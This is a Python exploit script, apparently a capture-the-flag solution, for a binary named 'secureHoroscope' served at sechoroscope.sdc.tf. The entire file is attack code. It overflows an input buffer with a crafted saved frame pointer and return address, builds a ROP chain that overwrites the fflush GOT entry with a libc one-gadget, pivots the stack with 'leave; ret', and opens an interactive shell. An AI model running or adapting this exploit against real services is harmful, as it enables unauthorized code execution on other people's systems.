#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./secureHoroscope')
host = args.HOST or 'sechoroscope.sdc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

sla("To get started, tell us how you feel\n", "A")
sla("day/year/time) and we will have your very own horoscope\n\n", b"A"*112 + p(0x6010c0+0x70) + p(0x00000000004007cf) + p(0xdeadbeef) )
rop = add_gadget(exe.got.fflush, libc.address+0x7e790, one_shot()[1]) + pivot(exe.got.fflush)
sl( rop.ljust(112, b"A")  + p(0x6010c0-8) + gadget("leave; ret") )

io.interactive()